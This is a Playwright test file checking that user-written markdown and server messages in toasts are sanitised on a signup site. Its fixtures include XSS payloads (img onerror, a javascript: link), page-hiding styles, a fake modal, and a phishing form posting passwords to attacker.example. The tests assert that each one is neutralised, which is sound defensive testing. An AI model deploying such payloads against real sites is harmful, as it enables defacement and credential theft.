// HTML that users or servers write: markdown is shown with its formatting but without anything
// that could run code, restyle or cover the page, or fake a form; toasts show names and server
// messages as text.
import type { Page } from '@playwright/test';

import { ok } from '../support/factories/base.ts';
import { publicCampaign } from '../support/factories/core.ts';
import { toast } from '../support/shell.ts';
import { test, expect } from '../support/test.ts';

// Each payload sets window.__injected when it gets to run.
const injected = (page: Page): Promise<unknown> => page.evaluate(() => (window as unknown as { __injected?: unknown }).__injected);
const PAYLOAD = '<img src="https://images.example.org/x.png" onerror="window.__injected = true">';

test.describe('HTML from users and servers', () => {
    test.use({ session: 'anonymous' });

    test('markdown keeps its formatting but drops scripts, styles, forms, classes and unsafe links', async ({ page, api }) => {
        const description = [
            'Intro with **bold text** and a [normal link](https://www.aegee.org).',
            '',
            '<img src="https://images.example.org/x.png" onerror="window.__injected = \'img\'">',
            '',
            '<style>body { display: none !important; }</style>',
            '',
            '<form action="https://attacker.example/login"><input name="password" type="password"><button>Log in again</button></form>',
            '',
            '<p style="position: fixed; inset: 0; background: white;">Covering the page</p>',
            '',
            '<div class="modal is-active"><div class="modal-background"></div><div class="modal-content box">Session expired</div></div>',
            '',
            '[click me](javascript:window.__injected=\'link\')',
            '',
            '[mail the board](mailto:board@example.org) or [download it](ftp://example.org/file)'
        ].join('\n');
        api.json('GET core /campaigns/:id', ok(publicCampaign({ url: 'spring', description_long: description })));

        await page.goto('/signup/spring');
        await expect(page.getByText('Intro with')).toBeVisible();

        // Markdown itself still works.
        await expect(page.getByRole('strong').filter({ hasText: 'bold text' })).toBeVisible();
        await expect(page.getByRole('link', { name: 'normal link' })).toHaveAttribute('href', 'https://www.aegee.org');

        // What could restyle or cover the page is gone, the text stays.
        await expect(page.getByRole('main')).toBeVisible();
        await expect(page.getByText('Covering the page')).toBeVisible();
        await expect(page.getByText('Covering the page')).not.toHaveAttribute('style');
        // Classes are dropped too: with Bulma's modal classes this would cover the whole page.
        await expect(page.getByText('Session expired')).toBeVisible();
        await expect(page.getByText('Session expired')).not.toHaveAttribute('class');
        // No form to fake a login with.
        await expect(page.getByText('Log in again')).toBeVisible();
        await expect(page.getByRole('button', { name: 'Log in again' })).toHaveCount(0);

        // Only http(s), mailto: and tel: links stay links.
        await expect(page.getByRole('link', { name: 'mail the board' })).toHaveAttribute('href', 'mailto:board@example.org');
        await expect(page.getByText('download it')).toBeVisible();
        await expect(page.getByRole('link', { name: 'download it' })).toHaveCount(0);
        await expect(page.getByRole('link', { name: 'click me' })).toHaveCount(0);
        await page.getByText('click me').click();
        expect(await injected(page)).toBeUndefined();
    });

    test('an error toast shows the server\'s message as text', async ({ page, api }) => {
        api.on('POST core /confirm-email', { status: 500, json: { success: false, message: PAYLOAD } });
        await page.goto('/confirm_signup?token=mail-token');

        await page.getByRole('button', { name: 'Confirm your email' }).click();

        await expect(toast(page, `Could not confirm email: ${PAYLOAD}`)).toBeVisible();
        expect(await injected(page)).toBeUndefined();
    });

    test('a success toast shows the server\'s message as text', async ({ page, api }) => {
        api.json('POST core /password_reset', { success: true, message: `Sent to ${PAYLOAD}` });
        await page.goto('/password_reset');

        await page.getByRole('textbox', { name: 'Email' }).fill('member@example.com');
        await page.getByRole('button', { name: 'Reset password' }).click();

        await expect(toast(page, `Sent to ${PAYLOAD}`)).toBeVisible();
        expect(await injected(page)).toBeUndefined();
    });

    test('a toast names a network error', async ({ page, api }) => {
        api.on('POST core /confirm-email', { abort: 'failed' });
        await page.goto('/confirm_signup?token=mail-token');

        await page.getByRole('button', { name: 'Confirm your email' }).click();

        await expect(toast(page, 'Could not confirm email: Network Error')).toBeVisible();
    });
});
